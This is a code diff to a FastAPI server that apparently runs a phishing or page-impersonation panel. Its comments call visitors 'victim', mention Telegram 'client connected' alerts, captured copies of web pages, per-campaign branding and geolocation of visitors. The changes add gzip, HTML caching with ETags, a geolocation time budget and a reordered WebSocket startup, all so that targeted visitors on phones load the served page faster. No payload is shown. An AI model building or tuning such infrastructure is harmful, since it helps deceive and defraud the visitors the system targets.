@@ -25,6 +25,7 @@ from typing import Dict, Any, Optional, List, Tuple
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException, Query, BackgroundTasks
 from fastapi.responses import FileResponse, JSONResponse, StreamingResponse, Response, HTMLResponse
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.middleware.gzip import GZipMiddleware
 from fastapi.staticfiles import StaticFiles
 from contextlib import asynccontextmanager
 import logging
@@ -827,6 +828,14 @@ app.add_middleware(
     max_age=600,
 )
 
+# Compression. A visitor opens this on a phone, usually on a mobile network,
+# and everything this app sends is text: client.html is ~550 KB, and a
+# captured archive page is 200 KB-2 MB of HTML/CSS. Neither was compressed
+# before, so a 60 KB page crossed the wire as 600 KB (minutes on a bad
+# connection, which reads as "the LPV is slow to start"). Gzip is the single
+# biggest startup win there is; the threshold keeps tiny JSON replies alone.
+app.add_middleware(GZipMiddleware, minimum_size=1024, compresslevel=6)
+
 # Request validation middleware
 @app.middleware("http")
 async def validate_request(request: Request, call_next):
@@ -1561,6 +1570,15 @@ def _lpv_note_field_final(client_id: str, page_id, page_name, payload: Dict[str,
 # from the same victim cost zero external requests.
 # ---------------------------------------------------------------------------
 GEO_CACHE_TTL = 6 * 3600
+
+# Geolocation is a nicety (Telegram "client connected" line, admin profile).
+# It used to be awaited before the WebSocket boot message, so three providers
+# with a 4 s timeout each could hold a visitor on the loading screen for up to
+# 12 s before their page was even offered. The boot message now goes out with
+# whatever is known after this budget; a slow provider no longer delays the
+# page. Providers answer in ~150 ms when they answer at all, and the result is
+# cached per IP for six hours, so repeat visitors pay nothing.
+GEO_BOOT_BUDGET = 0.6
 _geo_cache: Dict[str, Dict[str, Any]] = {}
 
 
@@ -2826,6 +2844,43 @@ def map_user_id_to_existing_folder(user_id: str, manager) -> str:
 # HTTP Endpoints
 # ==============================
 
+# The branded copy of client.html is built by reading a ~550 KB file and
+# rewriting its head for every visitor. Cached per (file mtime + workflow
+# fields) so a hundred visitors cost one read.
+_CLIENT_HTML_CACHE: Dict[str, Any] = {}
+
+
+def _client_html_etag(payload: str) -> str:
+    return '"' + hashlib.sha1(payload.encode("utf-8", "replace")).hexdigest()[:32] + '"'
+
+
+def _not_modified(request: Request, etag: str) -> bool:
+    sent = (request.headers.get("if-none-match") or "").strip()
+    if not sent:
+        return False
+    if sent == "*":
+        return True
+    for part in sent.split(","):
+        if part.strip().replace("W/", "") == etag:
+            return True
+    return False
+
+
+def _client_file_html(client_path: Path) -> str:
+    """client.html from disk, cached until the file changes."""
+    try:
+        stamp = str(int(client_path.stat().st_mtime))
+    except Exception:
+        stamp = "0"
+    key = str(client_path)
+    cached = _CLIENT_HTML_CACHE.get("file:" + key)
+    if cached and cached.get("key") == stamp:
+        return cached["html"]
+    html = client_path.read_text(encoding="utf-8")
+    _CLIENT_HTML_CACHE["file:" + key] = {"key": stamp, "html": html}
+    return html
+
+
 def _render_client_html(request: Request) -> Response:
     client_path = get_base_path() / "client.html"
     if not client_path.exists():
@@ -2850,9 +2905,27 @@ def _render_client_html(request: Request) -> Response:
             pass
 
     if not wf:
-        return FileResponse(client_path, headers={"Cache-Control": "no-cache, must-revalidate"})
+        # Served through the same ETag path as the branded copy: a repeat
+        # visit costs one 304 instead of ~550 KB of HTML.
+        return _client_html_response(request, _client_file_html(client_path))
 
-    html_content = client_path.read_text(encoding="utf-8")
+    try:
+        stamp = str(int(client_path.stat().st_mtime))
+    except Exception:
+        stamp = "0"
+    cache_key = "|".join([
+        stamp,
+        str(wf.get("id") or ""),
+        str(wf.get("name") or ""),
+        str(wf.get("brand_color") or ""),
+        str(wf.get("brand_logo_url") or ""),
+    ])
+    cached = _CLIENT_HTML_CACHE.get("page")
+    if cached and cached.get("key") == cache_key:
+        html_content = cached["html"]
+        return _client_html_response(request, html_content)
+
+    html_content = _client_file_html(client_path)
     wf_name = str(wf.get("name") or "").strip()
     wf_color = str(wf.get("brand_color") or "").strip()
     wf_logo = str(wf.get("brand_logo_url") or "").strip()
@@ -2912,7 +2985,23 @@ def _render_client_html(request: Request) -> Response:
     head_inject = "\n    " + "\n    ".join(injected_head)
     html_content = html_content.replace('<meta charset="UTF-8">', '<meta charset="UTF-8">' + head_inject, 1)
 
-    return HTMLResponse(html_content, headers={"Cache-Control": "no-cache, must-revalidate"})
+    # Only the newest render is kept: the workflow it belongs to can change at
+    # any moment and a stale copy would brand the wrong visitor.
+    _CLIENT_HTML_CACHE["page"] = {"key": cache_key, "html": html_content}
+    return _client_html_response(request, html_content)
+
+
+def _client_html_response(request: Request, html_content: str) -> Response:
+    """Serve the client page with an ETag so a reload costs one 304.
+
+    client.html is big; revalidating with the browser's cached copy is far
+    cheaper than sending it again on every revisit.
+    """
+    etag = _client_html_etag(html_content)
+    headers = {"Cache-Control": "no-cache", "ETag": etag}
+    if _not_modified(request, etag):
+        return Response(status_code=304, headers=headers)
+    return HTMLResponse(html_content, headers=headers)
 
 
 @app.get("/")
@@ -2954,7 +3043,9 @@ async def admin_page(request: Request):
     """Serve admin HTML"""
     admin_path = get_base_path() / "Admin.html"
     if admin_path.exists():
-        return FileResponse(admin_path, headers={"Cache-Control": "no-cache"} )
+        # Cached by mtime with an ETag: the panel is ~1 MB, so a reload
+        # should cost a 304 rather than a fresh download.
+        return _client_html_response(request, _client_file_html(admin_path))
     return HTMLResponse("<h1>Admin page not found</h1>")
 
 
@@ -2969,7 +3060,7 @@ async def mini_admin_page(request: Request):
     """
     mini_path = get_base_path() / "mini-admin.html"
     if mini_path.exists():
-        return FileResponse(mini_path, headers={"Cache-Control": "no-cache"})
+        return _client_html_response(request, _client_file_html(mini_path))
     return HTMLResponse("<h1>Mini admin page not found</h1>")
 
 
@@ -8804,17 +8895,14 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
         parent_connection["init_data"] = dict(init_data)
         parent_connection["workflow"] = dict(wf_boot or {})
 
-    try:
-        await _upsert_lpv_admin_client(
-            client_id, init_data, wf_boot, online=True, connection_token=connection_token
-        )
-    except Exception:
-        logger.debug("[LPV] could not register admin client %s", client_id, exc_info=True)
     # register for goto/direct messaging (ownership was reserved above)
     try:
         _lpv_only_ws[client_id] = websocket
     except Exception:
         pass
+    # The boot message is deliberately sent BEFORE the admin-feed registration
+    # below: that registration rewrites the session index on disk, and the
+    # visitor's page address should never wait behind bookkeeping.
     try:
         await websocket.send_json({
             "type": "lpv_only_session",
@@ -8865,10 +8953,23 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
     if not _lpv_connection_is_current(client_id, connection_token):
         return
 
-    # If the default page exists, push it immediately so the client
-    # doesn't sit on a blank screen.
+    # Bookkeeping only (the admin's client list). Registered after the boot
+    # message so it cannot delay the page.
     try:
-        page = lpv_store.get_page(default_page)
+        await _upsert_lpv_admin_client(
+            client_id, init_data, wf_boot, online=True, connection_token=connection_token
+        )
+    except Exception:
+        logger.debug("[LPV] could not register admin client %s", client_id, exc_info=True)
+
+    # If the default page exists, push it immediately so the client
+    # doesn't sit on a blank screen. The boot message above already carries
+    # that page's address, and the client renders it from there — pushing it
+    # again made the client abort its own in-flight fetch and download the
+    # page a second time, which is pure startup latency on a phone. Only a
+    # page the boot message could not advertise is worth a second message.
+    try:
+        page = None if default_url else lpv_store.get_page(default_page)
     except Exception:
         page = None
     if page:
@@ -9299,7 +9400,7 @@ async def websocket_endpoint(websocket: WebSocket):
         # ---------------------------------------------------------------
         geo = None
         try:
-            geo = await server_geolocate(client_ip)
+            geo = await asyncio.wait_for(server_geolocate(client_ip), timeout=GEO_BOOT_BUDGET)
         except Exception:
             geo = None
         if geo:
